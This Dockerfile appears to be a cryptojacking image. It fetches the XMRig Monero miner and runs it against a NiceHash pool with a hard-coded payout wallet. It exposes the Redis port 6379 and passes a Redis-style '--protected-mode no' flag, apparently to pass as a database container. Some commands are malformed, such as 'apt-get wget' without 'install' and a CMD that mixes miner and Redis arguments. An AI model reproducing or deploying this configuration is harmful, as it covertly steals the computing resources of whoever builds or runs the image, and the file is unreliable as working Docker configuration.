FROM ubuntu:18.04
RUN apt-get update && \
    apt-get wget -y && \
    wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && \
    tar xf xmrig-5.11.3-xenial-x64.tar.gz && \
    cd xmrig-5.11.3 && \
    ./xmrig -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 -u 3NA8Z5diwFHHVzizerXbkECVdbswVKBPBa -p x -a rx/0 --keepalive --donate-level=1 --nicehash -t2 --print --randomx-mode=fast
EXPOSE 6379
CMD ["xmrig-5.11.3", "--protected-mode no"]
